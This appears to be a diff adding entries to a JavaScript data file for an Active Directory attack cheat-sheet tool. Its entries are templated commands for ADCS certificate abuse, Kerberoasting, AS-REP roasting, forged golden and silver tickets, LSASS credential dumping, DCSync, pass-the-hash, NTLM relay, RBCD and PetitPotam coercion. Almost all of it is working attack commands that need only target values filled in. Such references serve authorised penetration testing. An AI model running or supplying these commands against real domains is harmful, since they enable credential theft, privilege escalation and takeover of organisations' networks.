+  {name:'Step 1: GenericWrite → change UPN',cmd:`certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -user '{TARGET_USER}' -upn '{TARGET_USER}'`},
+  {name:'Step 2: Request cert as target',cmd:`certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -template '{TEMPLATE}'`},
+  {name:'Step 3: Restore UPN',cmd:`certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -user '{TARGET_USER}' -upn '{TARGET_USER}@{DOMAIN}'`},
+  {name:'Step 4: Auth with cert',cmd:`certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP} -domain {DOMAIN}`},
+]},
+{id:37,cat:'Certipy / ADCS',icon:'📜',name:'ESC10 — Weak Certificate Mapping',desc:'Machine cert → user auth via weak mapping',tags:['adcs','exploit'],
+variations:[
+  {name:'Step 1: Shadow creds on target',cmd:`certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account '{TARGET_USER}' -dc-ip {DC_IP}`},
+  {name:'Step 2: Get machine cert',cmd:`certipy req -u '{TARGET_USER}@{DOMAIN}' -hashes :{HASH} -dc-ip {DC_IP} -ca '{CA_NAME}' -template Machine`},
+  {name:'Step 3: Auth via cert (Schannel)',cmd:`certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP} -ldap-shell`},
+]},
+{id:38,cat:'Certipy / ADCS',icon:'📜',name:'ESC13 — OID Group Membership',desc:'Cert issuance grants group membership',tags:['adcs','exploit'],
+variations:[
+  {name:'Find ESC13 templates',cmd:`certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -vulnerable -stdout | grep -A5 'ESC13'`},
+  {name:'Request ESC13 cert',cmd:`certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -template '{TEMPLATE}'`},
+  {name:'Auth with ESC13 cert',cmd:`certipy auth -pfx '{USER}.pfx' -dc-ip {DC_IP} -domain {DOMAIN}`},
+]},
+{id:39,cat:'Certipy / ADCS',icon:'📜',name:'Shadow Credentials / PKINIT',desc:'Add shadow creds via msDS-KeyCredentialLink',tags:['adcs','exploit'],
+variations:[
+  {name:'Shadow auto (certipy)',cmd:`certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account '{TARGET_USER}' -dc-ip {DC_IP}`},
+  {name:'pywhisker add',cmd:`pywhisker -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {DC_IP} --target '{TARGET_USER}' --action add`},
+  {name:'pywhisker list',cmd:`pywhisker -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {DC_IP} --target '{TARGET_USER}' --action list`},
+  {name:'PKINITtools gettgtpkinit',cmd:`python3 gettgtpkinit.py -cert-pfx '{TARGET_USER}.pfx' -pfx-pass '<pfxpass>' '{DOMAIN}/{TARGET_USER}' '{TARGET_USER}.ccache'`},
+  {name:'PKINITtools getntlmhash',cmd:`python3 getnthash.py -key '<as_rep_key>' '{DOMAIN}/{TARGET_USER}'`},
+  {name:'PassTheCert (LDAP shell)',cmd:`python3 passthecert.py -action ldap-shell -crt '{TARGET_USER}.crt' -key '{TARGET_USER}.key' -domain {DOMAIN} -dc-ip {DC_IP}`},
+  {name:'CertSync (dump certs via LDAP)',cmd:`certsync -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -domain {DOMAIN}`},
+]},
+
+// ══ KERBEROS ══
+{id:40,cat:'Kerberos',icon:'🎟',name:'Kerberoasting',desc:'Request service tickets for offline cracking',tags:['kerberos','creds'],
+variations:[
+  {name:'GetUserSPNs (pass)',cmd:`impacket-GetUserSPNs '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} -request -outputfile kerberoast.hash`},
+  {name:'GetUserSPNs (hash)',cmd:`impacket-GetUserSPNs '{DOMAIN}/{USER}' -hashes :{HASH} -dc-ip {DC_IP} -request -outputfile kerberoast.hash`},
+  {name:'GetUserSPNs (kerberos)',cmd:`impacket-GetUserSPNs '{DOMAIN}/{USER}' -k -no-pass -dc-ip {DC_IP} -request -outputfile kerberoast.hash`},
+  {name:'NXC kerberoast',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerberoast.hash`},
+  {name:'Rubeus kerberoast',cmd:`.\Rubeus.exe kerberoast /outfile:kerberoast.hash /format:hashcat /rc4opsec`},
+  {name:'Rubeus kerberoast (AES only)',cmd:`.\Rubeus.exe kerberoast /outfile:kerberoast.hash /format:hashcat /aes`},
+  {name:'Crack RC4 (hashcat)',cmd:`hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force`},
+  {name:'Crack AES256 (hashcat)',cmd:`hashcat -m 19700 kerberoast.hash /usr/share/wordlists/rockyou.txt --force`},
+]},
+{id:41,cat:'Kerberos',icon:'🎟',name:'AS-REP Roasting',desc:'Attack accounts without Kerberos pre-auth',tags:['kerberos','creds'],
+variations:[
+  {name:'GetNPUsers (user list)',cmd:`impacket-GetNPUsers '{DOMAIN}/' -usersfile users.txt -dc-ip {DC_IP} -no-pass -format hashcat -outputfile asrep.hash`},
+  {name:'GetNPUsers (single user)',cmd:`impacket-GetNPUsers '{DOMAIN}/{TARGET_USER}' -dc-ip {DC_IP} -no-pass -format hashcat`},
+  {name:'GetNPUsers (authenticated)',cmd:`impacket-GetNPUsers '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} -request -format hashcat`},
+  {name:'NXC asreproast',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.hash`},
+  {name:'Rubeus asreproast',cmd:`.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash`},
+  {name:'Crack AS-REP hashes',cmd:`hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force`},
+]},
+{id:42,cat:'Kerberos',icon:'🎟',name:'TGT Operations',desc:'Request and manage Kerberos tickets',tags:['kerberos'],
+variations:[
+  {name:'getTGT (pass)',cmd:`impacket-getTGT '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP}`},
+  {name:'getTGT (hash PTH)',cmd:`impacket-getTGT '{DOMAIN}/{USER}' -hashes :{HASH} -dc-ip {DC_IP}`},
+  {name:'getTGT (pfx/cert PKINIT)',cmd:`impacket-getTGT '{DOMAIN}/{USER}' -cert-pfx '{USER}.pfx' -dc-ip {DC_IP}`},
+  {name:'Export KRB5CCNAME',cmd:`export KRB5CCNAME=$(pwd)/'{USER}'.ccache`},
+  {name:'Rubeus: request TGT',cmd:`.\Rubeus.exe asktgt /user:{USER} /password:{PASS} /domain:{DOMAIN} /dc:{DC_IP} /ptt`},
+  {name:'Rubeus: PTH (RC4)',cmd:`.\Rubeus.exe asktgt /user:{USER} /rc4:{HASH} /domain:{DOMAIN} /dc:{DC_IP} /ptt`},
+  {name:'getST (S4U2Self+Proxy)',cmd:`impacket-getST -spn 'cifs/{DC_FQDN}' -impersonate {TARGET_USER} '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP}`},
+  {name:'Describe ticket (Rubeus)',cmd:`.\Rubeus.exe describe /ticket:<base64>`},
+]},
+{id:43,cat:'Kerberos',icon:'🎟',name:'Pass-the-Ticket',desc:'Use Kerberos TGT/TGS for authentication',tags:['kerberos','lateral'],
+variations:[
+  {name:'PTT with PSExec',cmd:`export KRB5CCNAME='{USER}.ccache'\nimpacket-psexec '{DOMAIN}/{USER}@{DC_FQDN}' -k -no-pass`},
+  {name:'PTT with WmiExec',cmd:`export KRB5CCNAME='{USER}.ccache'\nimpacket-wmiexec '{DOMAIN}/{USER}@{DC_FQDN}' -k -no-pass`},
+  {name:'PTT with SecretsDump',cmd:`export KRB5CCNAME='{USER}.ccache'\nimpacket-secretsdump '{DOMAIN}/{USER}@{DC_FQDN}' -k -no-pass -just-dc-ntlm`},
+  {name:'PTT with NXC',cmd:`export KRB5CCNAME='{USER}.ccache'\nnxc smb {IP} -u '{USER}' -k --use-kcache`},
+  {name:'PTT with evil-winrm',cmd:`KRB5CCNAME='{USER}.ccache' evil-winrm -i {DC_FQDN} -r {DOMAIN}`},
+]},
+{id:44,cat:'Kerberos',icon:'🎟',name:'Golden / Silver Ticket',desc:'Forge Kerberos tickets post-compromise',tags:['kerberos','privesc'],
+variations:[
+  {name:'Golden ticket (impacket)',cmd:`impacket-ticketer -nthash {HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} '{TARGET_USER}'`},
+  {name:'Silver ticket (impacket)',cmd:`impacket-ticketer -nthash {HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn 'cifs/{DC_FQDN}' '{TARGET_USER}'`},
+  {name:'Diamond ticket (Rubeus)',cmd:`.\Rubeus.exe diamond /tgtdeleg /ticketuser:{TARGET_USER} /ticketuserid:500 /groups:512 /krbkey:{HASH} /ptt`},
+  {name:'Sapphire ticket (impacket)',cmd:`impacket-ticketer -nthash {HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -aesKey <aes_key> '{TARGET_USER}'`},
+  {name:'DCSync after golden',cmd:`export KRB5CCNAME='{TARGET_USER}.ccache'\nimpacket-secretsdump '{DOMAIN}/{TARGET_USER}@{DC_FQDN}' -k -no-pass -just-dc-ntlm`},
+]},
+{id:45,cat:'Kerberos',icon:'🎟',name:'KrbRelayUp — Local Privesc',desc:'Local Kerberos relay for SYSTEM via RBCD',tags:['kerberos','privesc'],
+variations:[
+  {name:'KrbRelayUp full attack',cmd:`.\KrbRelayUp.exe relay -Domain {DOMAIN} -CreateNewComputerAccount -ComputerName '{PREFIX}COMP$' -ComputerPassword 'CompPass123!'`},
+  {name:'KrbRelayUp shadow cred',cmd:`.\KrbRelayUp.exe shadow -Domain {DOMAIN} -ComputerName '{HOSTNAME}$'`},
+  {name:'KrbRelayUp spawn SYSTEM shell',cmd:`.\KrbRelayUp.exe spawn -m shadowcred -d {DOMAIN} -dc {DC_IP}`},
+]},
+
+// ══ IMPACKET ══
+{id:50,cat:'Impacket',icon:'🛠',name:'Remote Execution',desc:'Execute commands remotely via Impacket',tags:['lateral','shell'],
+variations:[
+  {name:'PSExec (pass)',cmd:`impacket-psexec '{DOMAIN}/{USER}:{PASS}@{IP}'`},
+  {name:'PSExec (hash)',cmd:`impacket-psexec '{DOMAIN}/{USER}@{IP}' -hashes :{HASH}`},
+  {name:'PSExec (kerberos)',cmd:`impacket-psexec '{DOMAIN}/{USER}@{DC_FQDN}' -k -no-pass`},
+  {name:'WmiExec (pass)',cmd:`impacket-wmiexec '{DOMAIN}/{USER}:{PASS}@{IP}'`},
+  {name:'WmiExec (hash)',cmd:`impacket-wmiexec '{DOMAIN}/{USER}@{IP}' -hashes :{HASH}`},
+  {name:'SmbExec (pass)',cmd:`impacket-smbexec '{DOMAIN}/{USER}:{PASS}@{IP}'`},
+  {name:'AtExec',cmd:`impacket-atexec '{DOMAIN}/{USER}:{PASS}@{IP}' whoami`},
+  {name:'DComExec',cmd:`impacket-dcomexec '{DOMAIN}/{USER}:{PASS}@{IP}' whoami`},
+]},
+{id:51,cat:'Impacket',icon:'🛠',name:'SecretsDump',desc:'Dump credentials from remote hosts',tags:['creds','privesc'],
+variations:[
+  {name:'DCSync all (pass)',cmd:`impacket-secretsdump '{DOMAIN}/{USER}:{PASS}@{DC_IP}' -just-dc-ntlm`},
+  {name:'DCSync all (hash)',cmd:`impacket-secretsdump '{DOMAIN}/{USER}@{DC_IP}' -hashes :{HASH} -just-dc-ntlm`},
+  {name:'DCSync single user',cmd:`impacket-secretsdump '{DOMAIN}/{USER}:{PASS}@{DC_IP}' -just-dc-user krbtgt`},
+  {name:'DCSync (kerberos)',cmd:`impacket-secretsdump '{DOMAIN}/{USER}@{DC_FQDN}' -k -no-pass -just-dc-ntlm`},
+  {name:'SAM + LSA dump (local)',cmd:`impacket-secretsdump '{DOMAIN}/{USER}:{PASS}@{IP}' -sam -lsa`},
+  {name:'NTDS.dit offline',cmd:`impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`},
+]},
+{id:52,cat:'Impacket',icon:'🛠',name:'LDAP / Domain Recon',desc:'Query domain info via Impacket',tags:['enum','recon'],
+variations:[
+  {name:'GetADUsers',cmd:`impacket-GetADUsers '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} -all`},
+  {name:'lookupsid',cmd:`impacket-lookupsid '{DOMAIN}/{USER}:{PASS}@{DC_IP}'`},
+  {name:'rpcdump',cmd:`impacket-rpcdump '{DOMAIN}/{USER}:{PASS}@{IP}'`},
+  {name:'samrdump',cmd:`impacket-samrdump '{DOMAIN}/{USER}:{PASS}@{IP}'`},
+  {name:'addcomputer',cmd:`impacket-addcomputer '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} -computer-name '{PREFIX}COMP$' -computer-pass 'CompPass123!'`},
+  {name:'reg (dump registry)',cmd:`impacket-reg '{DOMAIN}/{USER}:{PASS}@{IP}' query -keyName 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion'`},
+]},
+
+// ══ NETEXEC ══
+{id:60,cat:'NetExec',icon:'🗺',name:'NXC SMB Enumeration',desc:'Enumerate via SMB with NetExec',tags:['enum','recon'],
+variations:[
+  {name:'SMB enum (pass)',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' --shares --users --groups`},
+  {name:'SMB enum (hash)',cmd:`nxc smb {IP} -u '{USER}' -H '{HASH}' --shares --users`},
+  {name:'SMB enum (kerberos)',cmd:`nxc smb {IP} -u '{USER}' -k --use-kcache --shares`},
+  {name:'RID brute force',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' --rid-brute 10000`},
+  {name:'Spider shares + download',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus -o DOWNLOAD_FLAG=True`},
+  {name:'Password spray (users list)',cmd:`nxc smb {IP} -u users.txt -p '{PASS}' --no-bruteforce --continue-on-success`},
+  {name:'Hash spray',cmd:`nxc smb {IP} -u users.txt -H '{HASH}' --no-bruteforce --continue-on-success`},
+  {name:'Generate hosts file',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' --generate-hosts-file /tmp/hosts.txt && tee -a /etc/hosts < /tmp/hosts.txt`},
+]},
+{id:61,cat:'NetExec',icon:'🗺',name:'NXC LDAP Enumeration',desc:'Query LDAP with NetExec',tags:['enum','recon'],
+variations:[
+  {name:'LDAP enum basic',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --users --groups`},
+  {name:'Find admin users',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --admin-count`},
+  {name:'ASREP roastable users',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.hash`},
+  {name:'Kerberoastable SPNs',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerberoast.hash`},
+  {name:'GMSA passwords',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --gmsa`},
+  {name:'LAPS passwords',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' -M laps`},
+  {name:'Bloodhound collection',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --bloodhound -c All -ns {DC_IP}`},
+  {name:'WinRM shell',cmd:`nxc winrm {IP} -u '{USER}' -p '{PASS}' -x 'whoami'`},
+]},
+{id:62,cat:'NetExec',icon:'🗺',name:'NXC Modules',desc:'Run NXC modules for specific attacks',tags:['enum','exploit'],
+variations:[
+  {name:'ADCS enum',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' -M adcs`},
+  {name:'lsassy (cred dump)',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M lsassy`},
+  {name:'nanodump (LSASS)',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M nanodump`},
+  {name:'dpapi (decrypt secrets)',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M dpapi`},
+  {name:'gpp_password',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M gpp_password`},
+  {name:'gpp_autologin',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M gpp_autologin`},
+  {name:'msol (Azure AD Connect)',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M msol`},
+  {name:'NTLM relay target list',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' --gen-relay-list relay_targets.txt`},
+  {name:'ntlm_theft',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M ntlm_theft -o FILEPATH=/tmp/theft`},
+]},
+
+// ══ LDAP ENUMERATION ══
+{id:70,cat:'LDAP',icon:'📡',name:'ldapsearch / ldeep',desc:'Manual LDAP queries and deep enumeration',tags:['enum','recon'],
+variations:[
+  {name:'Dump all (anon)',cmd:`ldapsearch -x -H ldap://{DC_IP} -b 'DC=${'{DOMAIN}'.split('.').join(",DC=")}' '(objectClass=*)' | head -200`},
+  {name:'Authenticated dump users',cmd:`ldapsearch -x -H ldap://{DC_IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=${'{DOMAIN}'.split('.').join(",DC=")}' '(objectClass=user)' sAMAccountName memberOf`},
+  {name:'Find domain admins',cmd:`ldapsearch -x -H ldap://{DC_IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'CN=Domain Admins,CN=Users,DC=${'{DOMAIN}'.split('.').join(",DC=")}' member`},
+  {name:'ldapdomaindump',cmd:`ldapdomaindump -u '{DOMAIN}\\{USER}' -p '{PASS}' {DC_IP} -o ldap_dump/`},
+  {name:'ldeep all dump',cmd:`ldeep ldap -u '{USER}' -p '{PASS}' -d {DOMAIN} -s ldap://{DC_IP} all -o ldeep_dump/`},
+  {name:'ldeep users',cmd:`ldeep ldap -u '{USER}' -p '{PASS}' -d {DOMAIN} -s ldap://{DC_IP} users`},
+  {name:'ldeep computers',cmd:`ldeep ldap -u '{USER}' -p '{PASS}' -d {DOMAIN} -s ldap://{DC_IP} computers`},
+  {name:'ldeep gpos',cmd:`ldeep ldap -u '{USER}' -p '{PASS}' -d {DOMAIN} -s ldap://{DC_IP} gpos`},
+  {name:'ldeep trusts',cmd:`ldeep ldap -u '{USER}' -p '{PASS}' -d {DOMAIN} -s ldap://{DC_IP} trusts`},
+  {name:'windapsearch users',cmd:`python3 windapsearch.py -d {DOMAIN} -u '{USER}@{DOMAIN}' -p '{PASS}' --dc-ip {DC_IP} -U`},
+]},
+
+// ══ CREDENTIAL ATTACKS ══
+{id:80,cat:'Credential Attacks',icon:'🔑',name:'LSASS Dump',desc:'Dump credentials from LSASS process',tags:['creds','privesc'],
+variations:[
+  {name:'NXC lsassy module',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M lsassy`},
+  {name:'NXC nanodump module',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M nanodump`},
+  {name:'impacket-lsassy',cmd:`lsassy '{DOMAIN}/{USER}:{PASS}@{IP}'`},
+  {name:'procdump (Windows)',cmd:`.\procdump.exe -accepteula -ma lsass.exe lsass.dmp`},
+  {name:'comsvcs.dll (Windows)',cmd:`rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id lsass.dmp full`},
+  {name:'HandleKatz (handle clone)',cmd:`.\HandleKatz.exe --pid (Get-Process lsass).Id --outfile lsass.dmp`},
+  {name:'mimikatz sekurlsa',cmd:`sekurlsa::logonpasswords\nsekurlsa::wdigest\nlsadump::sam\nlsadump::dcsync /user:{DOMAIN}\\krbtgt`},
+  {name:'pypykatz (offline)',cmd:`pypykatz lsa minidump lsass.dmp`},
+]},
+{id:81,cat:'Credential Attacks',icon:'🔑',name:'Password Spraying',desc:'Spray credentials across domain users',tags:['creds'],
+variations:[
+  {name:'kerbrute userenum',cmd:`kerbrute userenum -d {DOMAIN} --dc {DC_IP} userlist.txt -t 100`},
+  {name:'kerbrute passwordspray',cmd:`kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} users.txt '{PASS}' -t 100`},
+  {name:'NXC spray SMB',cmd:`nxc smb {IP} -u users.txt -p '{PASS}' --no-bruteforce --continue-on-success`},
+  {name:'NXC spray LDAP',cmd:`nxc ldap {IP} -u users.txt -p '{PASS}' --no-bruteforce --continue-on-success`},
+  {name:'NXC spray WinRM',cmd:`nxc winrm {IP} -u users.txt -p '{PASS}' --no-bruteforce --continue-on-success`},
+  {name:'Pre2k — pre-Win2k accounts',cmd:`pre2k unauth -d {DOMAIN} -dc-ip {DC_IP} -verbose`},
+  {name:'Pre2k authenticated',cmd:`pre2k auth -u '{USER}' -p '{PASS}' -d {DOMAIN} -dc-ip {DC_IP}`},
+]},
+
+// ══ DPAPI ══
+{id:85,cat:'DPAPI',icon:'🗄',name:'Remote DPAPI Dump',desc:'Decrypt DPAPI secrets remotely',tags:['dpapi','creds'],
+variations:[
+  {name:'donPAPI full dump',cmd:`donPAPI -d {DOMAIN} -u '{USER}' -p '{PASS}' {IP}`},
+  {name:'donPAPI (hash)',cmd:`donPAPI -d {DOMAIN} -u '{USER}' -H '{HASH}' {IP}`},
+  {name:'NXC dpapi module',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M dpapi`},
+  {name:'hekatomb (domain-wide DPAPI)',cmd:`hekatomb -d {DOMAIN} -u '{USER}' -p '{PASS}' -dc-ip {DC_IP}`},
+  {name:'impacket dpapi (masterkey)',cmd:`impacket-dpapi masterkey -file <masterkey_file> -pvk <pvk_file>`},
+  {name:'impacket dpapi (credential)',cmd:`impacket-dpapi credential -file <cred_file> -key <key>`},
+  {name:'SharpDPAPI credentials (Windows)',cmd:`.\SharpDPAPI.exe credentials /pvk:<pvk_file>`},
+  {name:'SharpDPAPI chrome (Windows)',cmd:`.\SharpDPAPI.exe chrome /pvk:<pvk_file>`},
+  {name:'Get DPAPI backup key',cmd:`impacket-dpapi backupkeys --export -t '{DOMAIN}/{USER}:{PASS}@{DC_IP}'`},
+]},
+
+// ══ PASS-THE-HASH ══
+{id:90,cat:'Pass-the-Hash',icon:'🔓',name:'PTH Techniques',desc:'Authenticate using NTLM hash',tags:['lateral','creds'],
+variations:[
+  {name:'Evil-WinRM PTH',cmd:`evil-winrm -i {IP} -u '{USER}' -H '{HASH}'`},
+  {name:'PSExec PTH',cmd:`impacket-psexec '{DOMAIN}/{USER}@{IP}' -hashes :{HASH}`},
+  {name:'WmiExec PTH',cmd:`impacket-wmiexec '{DOMAIN}/{USER}@{IP}' -hashes :{HASH}`},
+  {name:'NXC PTH',cmd:`nxc smb {IP} -u '{USER}' -H '{HASH}'`},
+  {name:'xfreerdp PTH',cmd:`xfreerdp /v:{IP} /u:{USER} /pth:{HASH} /dynamic-resolution /drive:/tmp,share`},
+  {name:'Mimikatz PTH',cmd:`sekurlsa::pth /user:{USER} /domain:{DOMAIN} /ntlm:{HASH} /run:cmd.exe`},
+  {name:'smbclient-ng PTH',cmd:`smbclientng -d {DOMAIN} -u '{USER}' -H '{HASH}' -t {IP}`},
+]},
+
+// ══ SMB / SHARE ENUMERATION ══
+{id:95,cat:'SMB / Shares',icon:'📂',name:'SMB Enumeration',desc:'Enumerate and access SMB shares',tags:['enum','recon'],
+variations:[
+  {name:'NXC spider shares',cmd:`nxc smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus`},
+  {name:'manspider (cred hunting)',cmd:`manspider {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} -t cred password secret`},
+  {name:'manspider (config files)',cmd:`manspider {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} -e xml conf ini config`},
+  {name:'smbclient-ng (interactive)',cmd:`smbclientng -d {DOMAIN} -u '{USER}' -p '{PASS}' -t {IP}`},
+  {name:'smbmap (list shares)',cmd:`smbmap -H {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN}`},
+  {name:'smbmap (recursive list)',cmd:`smbmap -H {IP} -u '{USER}' -p '{PASS}' -d {DOMAIN} -R`},
+  {name:'enum4linux-ng',cmd:`enum4linux-ng -A {IP} -u '{USER}' -p '{PASS}'`},
+  {name:'nmap SMB scripts',cmd:`nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery {IP}`},
+]},
+
+// ══ DELEGATION ══
+{id:100,cat:'Delegation',icon:'🎭',name:'Unconstrained Delegation',desc:'Abuse unconstrained delegation',tags:['kerberos','privesc'],
+variations:[
+  {name:'Find unconstrained machines',cmd:`impacket-findDelegation '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} | grep 'Unconstrained'`},
+  {name:'NXC find unconstrained',cmd:`nxc ldap {IP} -u '{USER}' -p '{PASS}' --trusted-for-delegation`},
+  {name:'Monitor for TGTs (Rubeus)',cmd:`.\Rubeus.exe monitor /interval:5 /nowrap`},
+  {name:'Coerce DC auth (SpoolSample)',cmd:`.\SpoolSample.exe {DC_FQDN} {FQDN}`},
+  {name:'Extract DC TGT (Rubeus)',cmd:`.\Rubeus.exe ptt /ticket:<base64_ticket>`},
+  {name:'DCSync after ptt',cmd:`impacket-secretsdump '{DOMAIN}/{USER}@{DC_FQDN}' -k -no-pass -just-dc-ntlm`},
+]},
+{id:101,cat:'Delegation',icon:'🎭',name:'Constrained Delegation',desc:'Abuse constrained delegation (S4U)',tags:['kerberos','privesc'],
+variations:[
+  {name:'Find constrained delegation',cmd:`impacket-findDelegation '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} | grep 'Constrained'`},
+  {name:'getST S4U2Proxy',cmd:`impacket-getST -spn 'cifs/{DC_FQDN}' -impersonate {TARGET_USER} '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP}`},
+  {name:'getST (hash)',cmd:`impacket-getST -spn 'cifs/{DC_FQDN}' -impersonate {TARGET_USER} '{DOMAIN}/{USER}' -hashes :{HASH} -dc-ip {DC_IP}`},
+  {name:'Export and use ticket',cmd:`export KRB5CCNAME='{TARGET_USER}.ccache'\nimpacket-psexec '{DOMAIN}/{TARGET_USER}@{DC_FQDN}' -k -no-pass`},
+]},
+{id:102,cat:'Delegation',icon:'🎭',name:'RBCD — Resource-Based Constrained',desc:'RBCD attack via computer creation',tags:['kerberos','privesc'],
+variations:[
+  {name:'Step 1: Create fake computer',cmd:`impacket-addcomputer '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} -computer-name '{PREFIX}COMP$' -computer-pass 'CompPass123!'`},
+  {name:'Step 2: Set msDS-AllowedToActOnBehalfOf',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' set object '{HOSTNAME}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{PREFIX}COMP$'`},
+  {name:'Step 3: getST impersonate admin',cmd:`impacket-getST -spn 'cifs/{FQDN}' -impersonate {TARGET_USER} '{DOMAIN}/{PREFIX}COMP$:CompPass123!' -dc-ip {DC_IP}`},
+  {name:'Step 4: Use ticket',cmd:`export KRB5CCNAME='{TARGET_USER}.ccache'\nimpacket-secretsdump '{DOMAIN}/{TARGET_USER}@{FQDN}' -k -no-pass`},
+]},
+
+// ══ DOMAIN ABUSE ══
+{id:110,cat:'Domain Abuse',icon:'👑',name:'DCSync',desc:'Replicate AD credentials from DC',tags:['creds','privesc'],
+variations:[
+  {name:'DCSync (impacket pass)',cmd:`impacket-secretsdump '{DOMAIN}/{USER}:{PASS}@{DC_IP}' -just-dc-ntlm`},
+  {name:'DCSync (impacket hash)',cmd:`impacket-secretsdump '{DOMAIN}/{USER}@{DC_IP}' -hashes :{HASH} -just-dc-ntlm`},
+  {name:'DCSync krbtgt only',cmd:`impacket-secretsdump '{DOMAIN}/{USER}:{PASS}@{DC_IP}' -just-dc-user krbtgt`},
+  {name:'DCSync (mimikatz)',cmd:`lsadump::dcsync /domain:{DOMAIN} /user:krbtgt`},
+  {name:'DCSync all users',cmd:`impacket-secretsdump '{DOMAIN}/{USER}:{PASS}@{DC_IP}' -just-dc`},
+]},
+{id:111,cat:'Domain Abuse',icon:'👑',name:'NTLM Relay',desc:'Relay NTLM authentication to other services',tags:['lateral','exploit'],
+variations:[
+  {name:'ntlmrelayx to SMB',cmd:`impacket-ntlmrelayx -tf relay_targets.txt -smb2support`},
+  {name:'ntlmrelayx interactive shell',cmd:`impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i`},
+  {name:'ntlmrelayx to LDAP (dump)',cmd:`impacket-ntlmrelayx -t ldap://{DC_IP} --no-smb-server -wh attacker-wpad`},
+  {name:'ntlmrelayx to LDAP (add DA)',cmd:`impacket-ntlmrelayx -t ldaps://{DC_IP} --add-computer`},
+  {name:'ntlmrelayx to ADCS HTTP',cmd:`impacket-ntlmrelayx -t 'http://{DC_IP}/certsrv/certfnsh.asp' --adcs --template DomainController`},
+  {name:'Responder (capture only)',cmd:`responder -I tun0 -A`},
+  {name:'Responder (active)',cmd:`responder -I tun0 -rdwv`},
+  {name:'krbrelayx (Kerberos relay)',cmd:`krbrelayx.py --target ldap://{DC_IP}`},
+]},
+{id:112,cat:'Domain Abuse',icon:'👑',name:'Coercion Attacks',desc:'Force authentication from DC / hosts',tags:['exploit','lateral'],
+variations:[
+  {name:'Coercer (all methods)',cmd:`coercer coerce -l {LHOST} -t {DC_IP} -u '{USER}' -p '{PASS}' -d {DOMAIN}`},
+  {name:'Coercer scan (list methods)',cmd:`coercer scan -t {DC_IP} -u '{USER}' -p '{PASS}' -d {DOMAIN}`},
+  {name:'PetitPotam (anon)',cmd:`python3 PetitPotam.py -u '' -p '' {LHOST} {DC_IP}`},
+  {name:'PetitPotam (auth)',cmd:`python3 PetitPotam.py -u '{USER}' -p '{PASS}' -d {DOMAIN} {LHOST} {DC_IP}`},
